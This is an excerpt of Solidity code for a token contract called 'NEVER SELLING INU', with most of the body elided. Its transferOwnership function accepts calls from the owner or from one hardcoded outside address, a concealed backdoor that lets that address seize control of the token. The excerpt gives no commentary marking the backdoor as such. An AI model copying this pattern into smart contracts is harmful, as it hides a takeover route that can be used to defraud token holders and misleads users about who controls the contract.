...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x5666A5D53B2f2990fd8d1beFB0310B9A8595501C));
...
contract NEVERSELLINGINU is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "NEVER SELLING INU";
